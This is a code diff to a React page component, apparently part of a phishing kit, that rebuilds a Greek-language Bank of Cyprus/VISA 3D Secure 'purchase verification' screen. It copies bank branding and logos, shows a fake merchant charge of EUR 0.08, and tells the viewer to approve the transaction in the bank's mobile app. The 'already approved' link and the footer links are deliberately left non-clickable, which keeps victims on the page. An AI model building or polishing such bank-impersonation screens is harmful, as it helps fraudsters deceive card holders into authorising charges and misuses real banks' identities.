@@ -1504,52 +1504,94 @@ export default function BbvaPage(props: any) {
 
       {/* ========================================================================= */}
       {/* 2.5. SCREEN 2.5: 3D SECURE VISA PURCHASE VERIFICATION (Approved Screen)   */}
-      {/* 3-Step Header at top: Step 3 (Approved)                                    */}
-      {/* ========================================================================= */}
-      {/* ========================================================================= */}
-      {/* 2.5. SCREEN 2.5: 3D SECURE PAYMENT CONFIRMATION (Approved Screen)         */}
-      {/* Pixel-perfect match to user-uploaded screenshot with 3-Step Header at top */}
+      {/* Original Bank of Cyprus design restored with fee updated to EUR 0.082     */}
       {/* ========================================================================= */}
       {currentScreen === "boc-verify" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-0 select-none">
-          {/* 3-Step Header: Step 3 (Approved) */}
-          <ThreeStepsHeader currentStep={3} />
-
-          {/* Main Body */}
-          <section className="w-full flex-1 flex flex-col px-6 pt-6 pb-7 select-none bg-white">
-            {/* Title: Confirm Payment */}
-            <h1 className="text-[20px] sm:text-[22px] font-normal text-[#1a1a1a] tracking-tight mb-5">
-              {language === "es" ? "Confirme el Pago" : "Confirm Payment"}
-            </h1>
-
-            {/* Warning / Authentication Alert Box matching photo in English */}
-            <div className="w-full flex items-start gap-3.5 mb-6">
-              <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full border-[2.2px] border-[#7d8b99] flex items-center justify-center shrink-0 text-[#7d8b99] font-bold text-[19px] leading-none select-none mt-0.5">
-                !
-              </div>
-              <p className="text-[13.5px] sm:text-[14px] text-[#2c3e50] leading-[1.48] font-normal">
-                {language === "es"
-                  ? "La autenticación no se ha completado con éxito. Por favor, consulte la aplicación de su banco y siga las instrucciones para completar el proceso de autenticación."
-                  : "Authentication was not successful. Please check your bank's app and follow the instructions to complete the authentication process."}
-              </p>
+          {/* Header: Left is Τράπεζα Κύπρου + Emblem, Right is VISA Logo */}
+          <header className="w-full px-6 pt-7 pb-4 flex items-center justify-between shrink-0 bg-white">
+            <div className="flex items-center gap-1.5 select-none">
+              <span
+                className="text-[#058998] font-serif font-bold text-[16px] sm:text-[17px] tracking-tight leading-none"
+                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
+              >
+                Τράπεζα Κύπρου
+              </span>
+              <img
+                src="/boc_logo.png"
+                alt="Τράπεζα Κύπρου"
+                className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[4px] shrink-0"
+              />
             </div>
 
-            {/* Simple clean text of deduction fee only (no entire box) */}
-            <p className="text-[13px] sm:text-[13.5px] text-[#4b5563] mt-1 mb-6">
-              {language === "es" ? "Deducción de tarifa: " : "Fee deduction: "}
-              <span className="font-semibold text-[#111827]">0.08 EUR</span>
+            <img
+              src="/visa_blue.svg"
+              alt="VISA"
+              className="h-[28px] sm:h-[32px] w-auto object-contain shrink-0"
+            />
+          </header>
+
+          {/* Main Body */}
+          <section className="w-full flex-1 flex flex-col px-6 pt-5 pb-8 select-none">
+            {/* Title: Πιστοποίηση Αγοράς */}
+            <h1 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#000000] tracking-tight mb-4">
+              Πιστοποίηση Αγοράς
+            </h1>
+
+            {/* Instruction description */}
+            <p className="text-[13.5px] sm:text-[14px] text-[#000000] leading-[1.45] font-normal mb-6">
+              Ελέγξτε το BoC Mobile App της Τράπεζας Κύπρου για να επιβεβαιώστε τη συναλλαγή σας.
             </p>
 
-            {/* Blue Button: I ALREADY AUTHORIZED. CONTINUE. (Non-clickable as requested) */}
-            <div className="w-full mt-auto pt-4 select-none">
-              <button
-                type="button"
-                disabled
-                className="w-full h-[46px] sm:h-[48px] rounded-[4px] bg-[#26538d] text-white text-[13px] sm:text-[13.5px] font-bold tracking-[0.06em] uppercase flex items-center justify-center shadow-sm select-none pointer-events-none cursor-default opacity-95"
-                aria-disabled="true"
-              >
-                {language === "es" ? "YA AUTORICÉ. CONTINUAR." : "I ALREADY AUTHORIZED. CONTINUE."}
-              </button>
+            {/* Data fields: ΕΜΠΟΡΑΣ, ΠΟΣΟ, ΗΜΕΡΟΜΗΝΙΑ */}
+            <div className="flex flex-col space-y-4 mb-7">
+              <div>
+                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
+                  ΕΜΠΟΡΑΣ
+                </p>
+                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
+                  FAHIPAY
+                </p>
+              </div>
+
+              <div>
+                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
+                  ΠΟΣΟ
+                </p>
+                <p className="text-[14px] font-semibold text-[#000000] mt-0.5">
+                  EUR 0.08
+                </p>
+              </div>
+
+              <div>
+                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
+                  ΗΜΕΡΟΜΗΝΙΑ
+                </p>
+                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
+                  {currentDateFormatted}
+                </p>
+              </div>
+            </div>
+
+            {/* Δεν δουλεύει; & Έχω ήδη εγκρίνει την συναλλαγή (Non-clickable) */}
+            <div className="flex flex-col mb-10 select-none">
+              <p className="text-[13.5px] font-bold text-[#000000] mb-1">
+                Δεν δουλεύει;
+              </p>
+              <span className="text-left text-[13.5px] text-[#0052cc] underline underline-offset-2 font-normal cursor-default select-none pointer-events-none inline-block">
+                Έχω ήδη εγκρίνει την συναλλαγή
+              </span>
+            </div>
+
+            {/* Bottom Footer Links (Non-clickable) */}
+            <div className="flex items-center justify-between pt-12 mt-auto select-none pointer-events-none">
+              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
+                Όροι και Προϋποθέσεις
+              </span>
+
+              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
+                Έξοδος
+              </span>
             </div>
           </section>
         </main>
